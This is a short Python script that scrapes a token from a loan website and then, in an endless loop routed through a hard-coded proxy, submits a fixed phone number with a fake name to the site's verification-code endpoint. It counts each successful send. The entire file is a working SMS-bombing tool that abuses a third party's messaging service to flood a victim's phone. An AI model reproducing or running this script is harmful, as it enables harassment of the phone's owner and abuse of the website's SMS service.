import time

import requests
from lxml import etree

success_count = 0
faild_count = 0


def zgdk(phone):
    global success_count, faild_count
    proxy = {'http': '36.56.148.154:33206'}
    session = requests.session()
    url = 'https://91rongduoduo.com/m/bdss04'
    text = session.get(url).text
    html = etree.HTML(text)
    usertoken = html.xpath('//input[@id="usertoken"]/@value')[0]
    data = {
        'phone': phone,
        'name': '张伟伟',
        'usertoken': usertoken
    }
    response = session.post(url='https://91rongduoduo.com/m/center_code', data=data, proxies=proxy)
    text = response.text
    # print(response.text)
    if '发送成功' in text:
        print('正规贷款信息发送成功!')
        success_count = success_count + 1
    else:
        faild_count = faild_count + 1
        print('正规贷款信息发送失败！')


while 1:
    zgdk('18888888881')
    print('          成功{}次       失败{}次'.format(success_count, faild_count))
    # time.sleep(1)
